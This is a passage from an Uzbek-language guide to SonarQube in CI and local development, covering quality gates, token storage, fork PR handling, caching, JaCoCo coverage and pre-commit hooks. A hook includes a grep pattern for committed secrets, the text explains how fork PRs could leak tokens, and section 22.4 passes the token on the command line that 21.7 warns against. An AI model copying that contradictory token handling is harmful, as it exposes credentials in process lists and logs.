### 21.6 `sonar.qualitygate.wait` bilan build ni to'xtatish va timeout masalasi

Default holda scanner ma'lumotni serverga yuboradi va darhol muvaffaqiyat bilan tugaydi. Server esa tahlilni fon vazifasi sifatida qayta ishlaydi. Ya'ni build yashil bo'ladi, gate esa bir necha sekunddan keyin qizil bo'lishi mumkin. Buni tuzatish uchun `sonar.qualitygate.wait=true` ishlatiladi.

Bu parametr yoqilganda scanner fon vazifasi tugashini kutadi, keyin gate natijasini so'raydi. Gate ERROR bo'lsa scanner nolga teng bo'lmagan exit code bilan tugaydi va CI qadami yiqiladi.

Kutish cheksiz emas. `sonar.qualitygate.timeout` parametri sekundda belgilanadi va default qiymati odatda 300 sekund atrofida. Aniq qiymat versiyaga qarab farq qiladi, shuning uchun uni ataylab o'zingiz yozib qo'ying. Katta monorepo da server navbati band bo'lsa 300 sekund yetmaydi va build timeout dan yiqiladi, garchi kod toza bo'lsa ham.

```bash
# CI dagi tahlilni lokalda aynan takrorlash
export SONAR_TOKEN="$(cat ~/.config/sonar/token)"   # tokenni echo qilmaymiz
export SONAR_HOST_URL="https://sonar.internal.example.com"

mvn -B -ntp clean verify
test -f target/site/jacoco/jacoco.xml || { echo "jacoco XML yo'q"; exit 1; }

mvn -B -ntp sonar:sonar \
  -Dsonar.qualitygate.wait=true \
  -Dsonar.qualitygate.timeout=900        # sekundda, katta loyiha uchun oshirildi

# tokenni buyruq qatorida bermaymiz, chunki u process ro'yxatida ko'rinadi
```

Timeout ni cheksiz oshirish ham yechim emas, chunki CI runner vaqti pul turadi. Agar tahlil muntazam 10 minutdan oshsa, muammo timeout da emas, tahlil hajmida. Bu holda exclusions va modul tanlash ustida ishlash kerak.

### 21.7 Token va maxfiy ma'lumotni CI da saqlash

Token turini to'g'ri tanlash xavfni sezilarli kamaytiradi. SonarQube da bir nechta token turi bor va ularning imkoniyati farq qiladi. CI uchun eng tor variant loyiha darajasidagi analysis token, chunki u faqat bitta loyihani tahlil qilishga yetadi. User token esa o'sha foydalanuvchining barcha huquqlarini olib yuradi, ya'ni token oqib ketsa zarar kattaroq.

Tokenni hech qachon repository ichida saqlamang. Na `pom.xml` da, na `sonar-project.properties` da, na Dockerfile da. Uning joyi faqat CI secret store: GitHub Actions secrets, GitLab masked va protected variable, Jenkins credentials.

Tokenni `-Dsonar.token=` orqali buyruq qatorida uzatmang. Buyruq qatori jarayon ro'yxatida va ba'zan log da ko'rinadi. To'g'ri yo'l `SONAR_TOKEN` muhit o'zgaruvchisi, chunki scanner uni o'zi o'qiydi.

Token muddatini belgilang va aylantirish jadvalini yozib qo'ying. Muddatsiz token qulay, lekin u yillar davomida kimning qo'lida qolganini hech kim bilmaydi. Muddat tugashi build ni yiqitadi va bu yaxshi signal, chunki u aylantirish vaqti kelganini aytadi.

Huquq berishda eng kam imkoniyat qoidasiga amal qiling. CI foydalanuvchisiga faqat "Execute Analysis" huquqi kerak. Unga administrator huquqi berish keng tarqalgan xato, chunki keyin o'sha token quality gate shartlarini ham o'zgartira oladi.

### 21.8 Shallow clone muammosi va `fetch-depth` sozlash

Sonar git blame ma'lumotini ishlatadi. Blame orqali u har qatorning sanasi va muallifini biladi. Shu ma'lumot ustiga uchta narsa qurilgan: new code chegarasini aniqlash, issue ni mualliflarga biriktirish va yangi issue larni eski issue lardan ajratish.

CI tizimlari tezlik uchun default holda qisqartirilgan clone qiladi. GitHub Actions `actions/checkout` da bitta commit oladi. GitLab `GIT_DEPTH` ni kichik qiymatga qo'yadi. Jenkins da "shallow clone" opsiyasi tez tez yoqilgan bo'ladi.

Natija ko'pincha chalkash ko'rinadi. New code bo'limi bo'sh chiqadi, yoki aksincha butun fayl yangi deb hisoblanadi. Issue lar hech kimga biriktirilmaydi. Ba'zan log da blame ma'lumoti topilmagani haqida ogohlantirish chiqadi va u e'tibordan chetda qoladi.

Yechim bitta: tahlil qilinadigan job da to'liq tarix bo'lsin. GitHub Actions da `fetch-depth: 0`, GitLab da `GIT_DEPTH: "0"`, Jenkins da shallow clone ni o'chirish. Tarix og'ir bo'lsa, faqat Sonar job ida to'liq clone qiling, qolgan job larda qisqartirilgan qoldiring.

Yana bir nuance: `sonar.scm.disabled=true` parametri blame ni butunlay o'chiradi. Uni ba'zan tezlik uchun qo'yib yuboradilar va keyin new code nega ishlamayotganini tushunmaydilar. Bu parametr faqat git bo'lmagan muhitda o'rinli.

### 21.9 Fork dan kelgan PR va token yetishmasligi

Tashqi contributor fork dan PR ochganda GitHub secrets ni bermaydi. Bu ataylab qilingan xavfsizlik chorasi. Agar secrets berilsa, har qanday odam PR ichiga bitta qator qo'shib sizning SONAR_TOKEN ingizni o'ziga yuborib olardi.

Shuning uchun fork PR da Sonar qadami token bo'lmagani uchun yiqiladi. Eng yomoni, ba'zi konfiguratsiyalarda u jim o'tadi va natija hech qayerda ko'rinmaydi. Ikkala holat ham chalg'ituvchi.

To'g'ri yo'l fork ni aniq tekshirib, qadamni ataylab o'tkazib yuborish va sababni log ga yozish.

```yaml
      - name: Sonar tahlili (fork PR da o'tkazib yuboriladi)
        if: github.event.pull_request.head.repo.full_name == github.repository
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ vars.SONAR_HOST_URL }}
        run: mvn -B -ntp sonar:sonar -Dsonar.qualitygate.wait=true
      - name: Fork PR haqida ogohlantirish
        if: github.event.pull_request.head.repo.full_name != github.repository
        run: |
          echo "Fork PR: Sonar tahlili o'tkazib yuborildi, token berilmaydi."
          echo "Gate main branch ga merge dan keyin tekshiriladi."
```

`pull_request_target` trigger i secrets beradi, lekin u default branch kontekstida ishlaydi. Agar u bilan fork kodini checkout qilib ishga tushirsangiz, tashqi kod sizning secret lari bilan bir muhitda bajariladi. Bu to'g'ridan to'g'ri token oqishi. Shuning uchun bu yo'lni faqat fork kodini bajarmaydigan qadamlar uchun ishlatish mumkin.

Amalda ko'pchilik jamoa uchun eng sog'lom qaror shu: fork PR da Sonar ishlamaydi, review odam tomonidan qilinadi, gate esa merge dan keyin main branch da ishlaydi.

### 21.10 Tahlil vaqtini qisqartirish: kesh, modul tanlash, parallel ish

Birinchi qadam kesh. Ikki xil kesh bor va ular boshqa narsa. `~/.m2/repository` Maven dependency larini saqlaydi. `~/.sonar/cache` esa scanner serverdan yuklab oladigan tahlil plugin larini saqlaydi. Ikkinchisi odatda esdan chiqadi, lekin har build da o'nlab megabayt yuklanishni oldini oladi.

```yaml
      - name: Sonar scanner plugin keshi
        uses: actions/cache@v4
        with:
          path: ~/.sonar/cache
          key: sonar-cache-${{ runner.os }}-${{ hashFiles('**/pom.xml') }}
          restore-keys: sonar-cache-${{ runner.os }}-
      - name: Tahlil, keraksiz qismlar chiqarilgan
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ vars.SONAR_HOST_URL }}
        run: >
          mvn -B -ntp sonar:sonar
          -Dsonar.exclusions=**/generated/**,**/db/migration/**
          -Dsonar.cpd.exclusions=**/dto/**
          -Dsonar.qualitygate.wait=true
          -Dsonar.scanner.javaOpts=-Xmx2g
```

Ikkinchi qadam hajmni kamaytirish. Generatsiya qilingan kod, migration fayllari va DTO larning takrorlanish tekshiruvi ko'p vaqt oladi va kam foyda beradi. Ularni `sonar.exclusions` va `sonar.cpd.exclusions` bilan chiqarish mumkin. Lekin diqqat bilan: exclusions ni haddan ziyod ishlatish gate ni ma'nosiz qiladi, chunki muammoli kod shunchaki ko'rinmas bo'ladi.

Uchinchi qadam parallel ish. Testlarni parallel ishga tushirish foydali va bu testlash qo'llanmasidagi mavzu. Sonar qadamini esa parallel qilib bo'lmaydi: bitta projectKey uchun bir vaqtda ikki tahlil yuborish server navbatida ziddiyat tug'diradi. To'g'ri sxema: testlar parallel job larda ishlaydi, coverage hisobotlari artifact sifatida yig'iladi, keyin bitta yakuniy job ularni birlashtirib tahlil yuboradi.

To'rtinchi qadam PR da yengilroq tahlil. PR tahlili tabiatan kichikroq, chunki u faqat o'zgargan qatorlarga qaraydi. Lekin kompilyatsiya va test to'liq bajariladi. Shuning uchun PR pipeline da og'ir integratsion test to'plamini ajratib, Sonar uchun kerakli minimal coverage ni ta'minlash ko'p hollarda yetarli.

Agar scanner xotira yetmasligidan yiqilsa, `sonar.scanner.javaOpts` bilan heap ni oshirish vaqtinchalik yordam beradi. Asl yechim esa tahlil hajmini kamaytirish, chunki heap ni cheksiz oshirib bo'lmaydi.

### 21.11 Tahlil uzilganda nima qilish: qayta urinish yoki bloklashni yumshatish

Birinchi ish sabab turini ajratish. Ikki xil yiqilish bor va ularga munosabat tamoman boshqacha. Gate yiqilishi haqiqiy signal: kod shartlarni qondirmadi. Infratuzilma yiqilishi esa shovqin: server yetib bo'lmadi, token muddati tugadi, navbat band.

Qayta urinish faqat ikkinchi turga o'rinli. Gate yiqilishini qayta urinib tuzatib bo'lmaydi, chunki kod o'zgarmagan. Avtomatik retry ni gate xatosiga qo'yish eng yomon qaror, chunki u muammoni yashiradi va CI vaqtini yeydi.

Exit code va log xabari turni ajratishga yordam beradi. 401 yoki 403 token muammosi. Ulanish xatosi server yoki tarmoq muammosi. Gate ERROR xabari esa kod muammosi.

| Tuzoq | Belgisi | Yechim |
| --- | --- | --- |
| Sonar testlardan oldin ishga tushgan | Coverage 0 foiz, gate new code coverage da yiqiladi | `verify` dan keyin ishga tushirish, JaCoCo XML borligini tekshirish |
| Test va tahlil orasida `clean` | Tahlil bytecode topmadi deb ogohlantiradi | Bir `mvn` sessiyasida yoki `clean` siz ketma ket bajarish |
| Shallow clone | New code bo'sh, issue lar mualliflanmagan | `fetch-depth: 0`, `GIT_DEPTH: "0"` |
| `qualitygate.wait` yo'q | Build yashil, gate qizil | `-Dsonar.qualitygate.wait=true` qo'shish |
| Gate timeout | Toza kodda ham build yiqiladi | `sonar.qualitygate.timeout` oshirish va tahlil hajmini kamaytirish |
| PR da izoh yo'q | Tahlil o'tgan, PR jim | Server da ALM integration va loyiha bog'lanishini tekshirish |
| Check majburiy emas | Qizil Sonar bilan merge bo'ladi | Branch protection ga required check qo'shish |
| Fork PR jim yiqiladi | Log da token xatosi, hech kim ko'rmaydi | `if` sharti bilan ataylab o'tkazib yuborish va sabab yozish |
| Token muddati tugadi | 401, barcha branch da birdan | Token aylantirish jadvali va muddat haqida ogohlantirish |
| `continue-on-error` doimiy qolgan | Gate mavjud, lekin hech narsani bloklamaydi | Muddatli istisno, sana bilan birga yoziladi va olib tashlanadi |

Legacy loyihada gate birdan qizil bo'lishi tabiiy. Bunda to'g'ri yo'l butun gate ni o'chirish emas, balki new code asosidagi shartlarni qoldirish. Yangi kod toza bo'lsin, eski qarz esa alohida reja bilan kamaysin. Bu yondashuv bloklashni saqlaydi va jamoani bloklamaydi.

Agar vaqtinchalik yumshatish kerak bo'lsa, uni ko'rinadigan qilib yozing. GitHub Actions da `continue-on-error: true` qo'shiladi, lekin izohda sana va sabab bo'lsin. Muddatsiz yumshatish bir yildan keyin "shunday bo'lgan" deb qoladi.

Serverda nima bo'layotganini tekshirish uchun Sonar API ishlatish kerak. Ba'zan bevosita ma'lumotlar bazasiga qarash istagi tug'iladi, lekin bu qo'llab quvvatlanmaydi va jadval nomlari versiyadan versiyaga o'zgaradi. Quyidagi so'rov faqat tekshiruv g'oyasini ko'rsatadi, uni ishlab chiqarish skriptiga aylantirmang.

```sql
-- DIQQAT: faqat o'qish uchun tekshiruv, jadval nomlari versiyaga qarab farq qiladi.
-- Ishlab chiqarishda bu emas, Sonar web API ishlatiladi.
SELECT p.kee          AS loyiha_kaliti,
       s.created_at   AS tahlil_vaqti,
       s.status       AS holat
FROM   snapshots s
JOIN   components p ON p.uuid = s.component_uuid
WHERE  p.kee = 'payment-service'
ORDER  BY s.created_at DESC
LIMIT  10;
```

Pipeline nosozligini tekshirishda yana bir foydali usul: tahlil natijasini kod tomonidan ham tasdiqlash. Masalan PR ga yangi metod qo'shilganda uning testi borligi gate da ko'rinishi kerak. Quyidagi juftlik shuni ko'rsatadi: metod PR da yangi, demak u new code ga kiradi va test bo'lmasa coverage sharti yiqiladi.

```java
// PR da qo'shilgan yangi metod, u new code ga kiradi
public Money qismanQaytarish(Order order, Money sorov) {
    if (sorov.compareTo(order.tolangan()) > 0) {
        throw new IllegalArgumentException("Qaytarish summasi to'lovdan katta");
    }
    return sorov;
}

// Shu testsiz PR da new code coverage sharti yiqiladi
@Test
void sorov_tolovdan_katta_bolsa_xato() {
    Order order = Order.tolangan(Money.of("100.00"));
    assertThatThrownBy(() -> service.qismanQaytarish(order, Money.of("150.00")))
            .isInstanceOf(IllegalArgumentException.class);
}

@Test
void sorov_tolov_ichida_bolsa_qaytadi() {
    Order order = Order.tolangan(Money.of("100.00"));
    assertThat(service.qismanQaytarish(order, Money.of("40.00")))
            .isEqualTo(Money.of("40.00"));
}
```

Ikkinchi test bo'lmasa, branch coverage to'liq bo'lmaydi va gate qizil qoladi. Ya'ni CI dagi gate xatosi ko'pincha pipeline sozlamasida emas, aynan shu darajada hal bo'ladi.

### 21.12 Amalda qo'llash

- [ ] Pipeline da tartibni tekshirib chiqing: `verify` tugagandan keyin `jacoco.xml` mavjudligini aniq shart bilan tasdiqlang, keyingina `sonar:sonar` ishga tushsin.
- [ ] Barcha CI konfiguratsiyasida to'liq git tarixini yoqing: `fetch-depth: 0` yoki `GIT_DEPTH: "0"`, keyin Sonar UI da new code bo'limi to'lganini tekshiring.
- [ ] Har bir tahlil qadamiga `-Dsonar.qualitygate.wait=true` va aniq `sonar.qualitygate.timeout` qo'shing, so'ngra ataylab qoidani buzuvchi commit bilan build yiqilishini sinab ko'ring.
- [ ] Tokenni loyiha darajasidagi analysis token ga almashtiring, muddat belgilang, CI secret store ga ko'chiring va buyruq qatoridan olib tashlang.
- [ ] Git platformasi tomonda Sonar check ni required status check qilib qo'ying, chunki Sonar o'zi merge ni bloklamaydi.
- [ ] Fork dan kelgan PR uchun `if` sharti yozib, tahlilni ataylab o'tkazib yuboring va log da sababni yozdiring.
- [ ] `~/.m2` va `~/.sonar/cache` keshini yoqib, tahlil vaqtini o'lchang, keyin generatsiya qilingan kodni exclusions ga qo'shib qayta o'lchang.
- [ ] Mavjud barcha `continue-on-error` va `allow_failure: true` holatlarini ro'yxatlang, har biriga sana va sabab yozing, muddati o'tganini olib tashlang.

## 22. Lokal tekshirish: IDE, sonar-scanner va tez qaytish (Local Feedback Loop)

Sonar natijasini faqat CI da ko'rish eng qimmat yo'l. Kod yozilgan payt bilan xato ko'rilgan payt orasida qancha vaqt o'tsa, tuzatish shuncha qimmatga tushadi. Bu bobda xatoni IDE da, keyin lokal `sonar-scanner` da, keyin pre-commit hookda tutib olish yo'li ko'rsatiladi. Maqsad bitta: CI ga faqat allaqachon toza bo'lgan kod borishi.

### 22.1 Nega xatoni CI da emas, yozayotganda ko'rish arzonroq

Tuzatish narxi vaqt bilan o'sadi, chunki kontekst yo'qoladi. Kod yozayotganda metodning nega shunday yozilganini yodda tutasan. Yarim kundan keyin CI qizil bo'lganda esa qaytib kirib, kontekstni boshidan tiklash kerak. Bu tiklash ishi kodni tuzatishning o'zidan ko'proq vaqt oladi.

CI orqali qaytish halqasi uzun. Push qilasan, runner navbatda turadi, build ketadi, test ketadi, keyin Sonar tahlil qiladi. Oddiy Spring loyihada bu 6 dan 20 daqiqagacha. Agar bitta cognitive complexity ogohlantirishi uchun shu halqani uch marta aylantirsan, bir soat yo'qoladi.

Yana bir narxi bor: PR dagi review. Reviewer Sonar ogohlantirishini o'qib, komment yozadi, sen tuzatasan, u yana qaraydi. Bu ikki kishining vaqti. IDE da ko'rilgan ogohlantirish esa hech kimning vaqtini olmaydi.

Shu sababli tekshiruvni uch bosqichga tarqatish kerak. IDE bir necha sekundda javob beradi. Lokal to'liq tahlil bir necha daqiqada. CI esa oxirgi to'siq bo'lib, quality gate ni hal qiladi. CI ni birinchi tekshirish joyi sifatida ishlatish, bu kompilyatorni server orqali chaqirishga o'xshaydi.

### 22.2 SonarLint ni IDE ga o'rnatish va ishlatish

SonarLint 2024 yildan beri "SonarQube for IDE" nomi bilan ham tarqatiladi. Ikki nom bir mahsulotni anglatadi, versiyaga qarab plugin katalogida biri yoki ikkinchisi ko'rinadi. IntelliJ IDEA da `Settings > Plugins > Marketplace` ichidan `SonarQube for IDE` deb qidiriladi va o'rnatiladi. VS Code va Eclipse uchun ham xuddi shu plugin bor.

O'rnatilgandan keyin u standalone rejimda ishlaydi. Ya'ni serverga ulanmasdan, o'zida bor qoidalar to'plami bilan faylni tekshiradi. Bu rejimda ko'p narsa topiladi: null dereference ehtimoli, ishlatilmagan o'zgaruvchi, noto'g'ri `equals`, murakkab metod. Lekin bu to'plam sening serveringdagi profil bilan bir xil emas.

Muhim sozlama: tahlil qachon ishlashi. Standart holatda u faqat ochilgan fayl uchun ishlaydi. Butun loyihani IDE ichidan tekshirish uchun `Analyze All Project Files` buyrug'i bor, lekin katta loyihada u sekin. Amalda to'g'ri odat: ochilgan fayl uchun avtomatik, modul uchun esa lokal `sonar-scanner`.

IDE da tahlil uchun kerakli JVM ni ham belgilash kerak. Plugin o'z Java jarayonini ishga tushiradi, va u loyihaning Java versiyasidan farq qilishi mumkin.

```properties
# .idea/sonarlint/ ichidagi sozlama IDE orqali yoziladi, qo'lda tahrirlanmaydi.
# Loyiha darajasida muhim bo'lgan narsa: tahlildan chiqarilgan fayllar.
# Generatsiya qilingan kodni IDE tahlilidan ham chiqarib tashlash kerak.
sonar.exclusions=**/generated/**,**/target/generated-sources/**,**/*_.java
# Test fayllari alohida toifaga kiradi, ularga boshqa qoidalar qo'llanadi.
sonar.test.inclusions=**/src/test/java/**
# Coverage hisoboti yo'li IDE uchun kerak emas, lekin scanner uchun shart.
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
```

### 22.3 Connected mode: server profilini IDE ga tortib olish

Standalone rejimning asosiy muammosi shu: IDE sening serveringdagi quality profile ni bilmaydi. Agar jamoa ba'zi qoidalarni o'chirgan yoki jiddiylikni o'zgartirgan bo'lsa, IDE buni ko'rmaydi. Natijada ikki xil haqiqat paydo bo'ladi.

Connected mode shu farqni yo'qotadi. Plugin serverga ulanadi, loyihaning quality profile ini, o'chirilgan qoidalarni va `New Code` chegarasini tortib oladi. Shundan keyin IDE da ko'ringan narsa server aytadigan narsaga yaqin bo'ladi.

Ulanish uchun token kerak. Token foydalanuvchi nomidan beriladi va parol o'rnini bosadi. Uni IDE ga qo'lda kiritasan, repozitoriyga hech qachon yozmaysan.

```bash
# 1. Serverda token yaratish: My Account > Security > Generate Tokens.
# Token turi "User Token" bo'lsin, "Project Analysis Token" faqat scanner uchun.

# 2. Ulanish ishlayotganini terminalda tekshirish:
curl -s -u "$SONAR_TOKEN:" \
  "https://sonar.company.uz/api/authentication/validate"
# Kutilgan javob: {"valid":true}

# 3. Loyihaning amaldagi quality profile ini ko'rish:
curl -s -u "$SONAR_TOKEN:" \
  "https://sonar.company.uz/api/qualityprofiles/search?project=payment-service" \
  | python3 -m json.tool

# 4. New Code chegarasi qanday sozlanganini bilish:
curl -s -u "$SONAR_TOKEN:" \
  "https://sonar.company.uz/api/new_code_periods/show?project=payment-service"
```

Connected mode yana bitta foyda beradi: serverda `Won't Fix` yoki `False Positive` deb belgilangan issue lar IDE da ham ko'rinmaydi. Bu shovqinni sezilarli kamaytiradi. Taxminan hafta davomida jamoa IDE ga ishonishni boshlaydi, chunki u yolg'on ogohlantirish bermaydi.

Connected mode ni butun jamoa uchun bir xil qilish kerak. Agar yarim jamoa standalone ishlasa, "menda ko'rinmayapti" bahsi qaytib keladi.

### 22.4 Lokal to'liq tahlilni ishga tushirish va natijani ko'rish

IDE hamma narsani topmaydi. Duplicated blocks, coverage, va butun loyiha bo'ylab hisoblanadigan metrikalar faqat to'liq tahlilda chiqadi. Shuning uchun PR ochishdan oldin bir marta lokal to'liq tahlil qilish foydali.

Maven loyihada tartib shunday: avval test va JaCoCo, keyin scanner. Tartibni buzish eng ko'p uchraydigan xato, chunki `sonar:sonar` ni alohida chaqirsang, JaCoCo hisoboti hali yo'q bo'ladi va coverage nol ko'rinadi.

```bash
# To'liq lokal tahlil: test, coverage, keyin scanner. Bitta zanjirda.
export SONAR_TOKEN='squ_xxxxxxxxxxxxxxxx'
export SONAR_HOST_URL='https://sonar.company.uz'

mvn -B clean verify \
    org.sonarsource.scanner.maven:sonar-maven-plugin:sonar \
    -Dsonar.projectKey=payment-service \
    -Dsonar.host.url="$SONAR_HOST_URL" \
    -Dsonar.token="$SONAR_TOKEN"

# Natija serverga yuboriladi, lekin quality gate javobini kutmaydi.
# Javobni kutish uchun alohida flag kerak:
mvn -B sonar:sonar -Dsonar.qualitygate.wait=true -Dsonar.qualitygate.timeout=300

# Gradle da xuddi shu ish:
./gradlew clean test jacocoTestReport sonar \
    -Dsonar.token="$SONAR_TOKEN" -Dsonar.host.url="$SONAR_HOST_URL"
```

Natijani ko'rishning ikki yo'li bor. Birinchisi brauzerda loyiha sahifasi, bu eng aniq. Ikkinchisi terminalda qaytgan `ANALYSIS SUCCESSFUL, you can find the results at ...` qatori, u to'g'ridan to'g'ri havola beradi.

Diqqat qiladigan narsa: lokal tahlil ham serverdagi natijani almashtiradi. Agar sen branch nomini bermasang, tahlil asosiy branch ustiga yozilib qolishi mumkin. Shu sababli lokal tahlilda `sonar.branch.name` ni albatta ko'rsatish kerak, yoki alohida `-local` suffiksli projectKey ishlatish kerak.

### 22.5 JaCoCo hisobotini lokal ochib, qaysi qator qamralmaganini ko'rish

Sonar coverage ni o'zi o'lchamaydi. U JaCoCo bergan XML ni o'qiydi. Ya'ni "coverage past" muammosini hal qilish uchun Sonar kerak emas, JaCoCo ning o'z HTML hisoboti yetarli va u tezroq.

JaCoCo HTML hisoboti qator darajasida rang beradi. Yashil qator bajarilgan, qizil bajarilmagan, sariq esa shart qisman qamralgan. Sariq eng muhim signal, chunki u `if (a && b)` dagi bitta shox tekshirilmaganini ko'rsatadi. Sonar buni `Conditions to cover` deb hisoblaydi.

```xml
<!-- pom.xml: JaCoCo XML va HTML hisobotini birga chiqarish. -->
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution>
      <id>jacoco-prepare</id>
      <goals><goal>prepare-agent</goal></goals>
    </execution>
    <execution>
      <!-- report goal ni verify ga bog'lash kerak, aks holda XML yozilmaydi. -->
      <id>jacoco-report</id>
      <phase>verify</phase>
      <goals><goal>report</goal></goals>
    </execution>
  </executions>
</plugin>
```

Hisobotni ochish juda oddiy, lekin ko'pchilik buni bilmaydi va to'g'ridan to'g'ri Sonar sahifasiga qaraydi.

```bash
# Faqat test va hisobot, scanner yo'q. Eng tez halqa.
mvn -B -q clean verify -DskipITs

# HTML hisobotni brauzerda ochish:
xdg-open target/site/jacoco/index.html   # Linux
# open target/site/jacoco/index.html     # macOS

# Qamralmagan qatorlarni terminalda sanash, XML dan to'g'ridan to'g'ri:
python3 - <<'PY'
import xml.etree.ElementTree as ET
t = ET.parse('target/site/jacoco/jacoco.xml')
for cls in t.iter('class'):
    missed = [l.get('nr') for l in cls.iter('line') if l.get('mi') != '0']
    if missed:
        print(cls.get('name'), '->', ','.join(missed[:15]))
PY
```

Bu skript qaysi klassning qaysi qatori qamralmaganini chiqaradi. Shundan keyin test yozish aniq ishga aylanadi. Qamrovni qanday test bilan to'ldirish kerakligi testlash qo'llanmasidagi unit test mavzusida batafsil.

Bitta ogohlantirish: `mi` atributi "missed instructions" degani, qator umuman bajarilmaganini bildirmaydi. Lekin amaliy maqsad uchun bu yetarli signal.

### 22.6 Commit oldidan tekshirish: pre-commit hook va uning chegarasi

Pre-commit hook arzon tekshiruvlar uchun yaxshi. Formatlash, oddiy statik tahlil, kompilyatsiya. Lekin unga to'liq Sonar tahlilini qo'yish xato, chunki har commit da bir necha daqiqa kutish jamoani hookni o'chirishga majbur qiladi.

```bash
#!/usr/bin/env bash
# .githooks/pre-commit  -  faqat tez tekshiruvlar.
set -euo pipefail

# O'zgargan Java fayllarni olish, o'chirilganlarni tashlab.
FILES=$(git diff --cached --name-only --diff-filter=ACM | grep '\.java$' || true)
[ -z "$FILES" ] && exit 0

# 1. Formatlash: avtomatik tuzatadi va qaytib stage ga qo'yadi.
mvn -B -q spotless:apply
echo "$FILES" | xargs git add

# 2. Kompilyatsiya: sintaksis xatosi commit ga tushmasin.
mvn -B -q compile -o || { echo "Kompilyatsiya buzilgan, commit to'xtatildi."; exit 1; }

# 3. Secret tekshiruvi: token yoki parol qo'shilmaganini ko'rish.
if git diff --cached | grep -nE '(squ_|AKIA[0-9A-Z]{16}|password\s*=\s*"[^"]{4,})'; then
  echo "Diff da sir bo'lishi mumkin. Tekshirib, keyin commit qil."
  exit 1
fi
echo "Pre-commit tekshiruvlari o'tdi."
```

Hookni jamoaga tarqatish uchun `core.hooksPath` ishlatiladi, chunki `.git/hooks` repozitoriyga tushmaydi.

```bash
# Bir marta sozlash, keyin hamma uchun ishlaydi.
git config core.hooksPath .githooks
chmod +x .githooks/pre-commit

# Tekshirish:
git config --get core.hooksPath

# Zudlik bo'lsa hookni chetlab o'tish mumkin, bu ataylab qoldirilgan:
git commit --no-verify -m "hotfix: to'lov statusi"
```

Hookning chegarasi aniq: u majburiy emas. `--no-verify` har doim bor, va u bo'lishi ham kerak. Shu sababli hook sifat kafolati emas, balki qulaylik. Majburiy qoidalar faqat CI da va quality gate da yashashi mumkin.

| Tuzoq | Nega yuz beradi | Yechim |
|---|---|---|
| Lokal coverage 0%, serverda 80% | `sonar:sonar` `verify` dan oldin ishladi, XML hali yo'q | `clean verify` va `sonar` ni bitta zanjirda chaqir |
| IDE da ogohlantirish yo'q, CI da bor | standalone rejim, server profili tortilmagan | connected mode ni yoq |
| Lokal tahlil asosiy branch natijasini buzdi | `sonar.branch.name` berilmagan | lokal uchun alohida projectKey yoki branch nomi ber |
| Pre-commit hook 4 daqiqa ishlaydi | hookka to'liq test yoki scanner qo'yilgan | hookda faqat format va compile qoldir |
| Duplicated blocks faqat CI da chiqadi | IDE butun loyihani ko'rmaydi | PR oldidan bir marta to'liq lokal tahlil |
| Sariq qatorlar e'tibordan chetda | faqat line coverage raqamiga qaralgan | JaCoCo HTML da branch ranglarini ko'r |
| Hook `--no-verify` bilan chetlab o'tiladi | hook majburiy emas | majburiy shartni quality gate ga ko'chir |
| Jamoada har xil format diff keltiradi | IDE sozlamalari sinxron emas | Spotless va EditorConfig ni repoga qo'y |

### 22.7 IDE ogohlantirishlari va Sonar natijasi mos kelmasligi sabablari

Bu savol har jamoada chiqadi va javobi odatda beshta sababdan bittasi. Birinchisi rejim: standalone IDE o'z qoidalar to'plamini ishlatadi, server esa quality profile ni. Ikkinchisi versiya: IDE plugin ichidagi analyzer versiyasi serverdagidan yangi yoki eski bo'lishi mumkin, va yangi qoidalar faqat bir tarafda bor.

Uchinchisi qamrov doirasi. IDE bitta faylni ko'radi, server butun loyihani. Shu sababli cross-file muammolar, duplicated code va `New Code` hisobi faqat serverda chiqadi. To'rtinchisi scope: fayl `sonar.exclusions` ga tushgan bo'lsa serverda umuman tahlil qilinmaydi, IDE esa uni ko'rib turadi.

Beshinchisi va eng chalkashi: `New Code` chegarasi. Serverdagi quality gate ko'p shartni faqat yangi kod uchun o'lchaydi. IDE esa butun faylni tekshiradi. Shu sababli IDE 20 ta ogohlantirish ko'rsatganda, quality gate faqat ikkitasini hisoblashi mumkin.

```bash
# Farqni aniqlash: serverdagi aniq issue ro'yxatini olib, IDE bilan solishtirish.
curl -s -u "$SONAR_TOKEN:" \
  "$SONAR_HOST_URL/api/issues/search?componentKeys=payment-service:src/main/java/uz/pay/PaymentService.java&resolved=false" \
  | python3 -c 'import json,sys; d=json.load(sys.stdin); [print(i["rule"], i.get("line"), i["message"][:60]) for i in d["issues"]]'

# Serverdagi analyzer versiyalarini ko'rish, IDE plugin versiyasi bilan solishtirish uchun:
curl -s -u "$SONAR_TOKEN:" "$SONAR_HOST_URL/api/plugins/installed" \
  | python3 -c 'import json,sys; [print(p["key"], p["version"]) for p in json.load(sys.stdin)["plugins"]]'
```

Agar farq topilsa, javob bitta: serverni haqiqat manbasi deb hisobla. IDE tezkor yordamchi, hakam emas.

### 22.8 Tez qaytish uchun tekshiruvlarni bosqichlarga bo'lish

Barcha tekshiruvni bitta buyruqqa yig'ish jozibali, lekin sekin. To'g'ri yondashuv bosqichlash: har bosqich oldingisidan qimmatroq va kamroq ishga tushadi.

| Bosqich | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Sintaksis | kompilyatsiyani CI kutadi | IDE da darhol, incremental compile |
| Formatlash | review da qo'lda aytiladi | Spotless pre-commit da avtomatik tuzatadi |
| Oddiy code smell | CI dagi Sonar aytadi | IDE connected mode da yozayotganda |
| Unit test | push dan keyin runner ishlaydi | lokal `verify -DskipITs`, 1 daqiqa |
| Coverage | Sonar sahifasida ko'riladi | JaCoCo HTML lokal ochiladi |
| Integratsion test | har push da to'liq | lokal faqat o'zgargan modulda, CI da to'liq |
| Duplicated code | hech kim qaramaydi | PR oldidan bir marta to'liq lokal tahlil |
| Quality gate | PR qizil bo'lganda bilinadi | lokal `qualitygate.wait` bilan oldindan |
| Secret | review da tasodifan topiladi | pre-commit grep va CI scanner, ikki qavat |
| Arxitektura qoidasi | og'zaki kelishuv | ArchUnit testi, lokal ham ishlaydi |

CI tomonida ham shu bosqichlash kerak. Tez ishlar oldin, qimmatlari keyin. Agar `fast` job yiqilsa, Sonar jobini umuman ishga tushirmaslik kerak.

```yaml
# .github/workflows/ci.yml  -  bosqichli pipeline.
name: ci
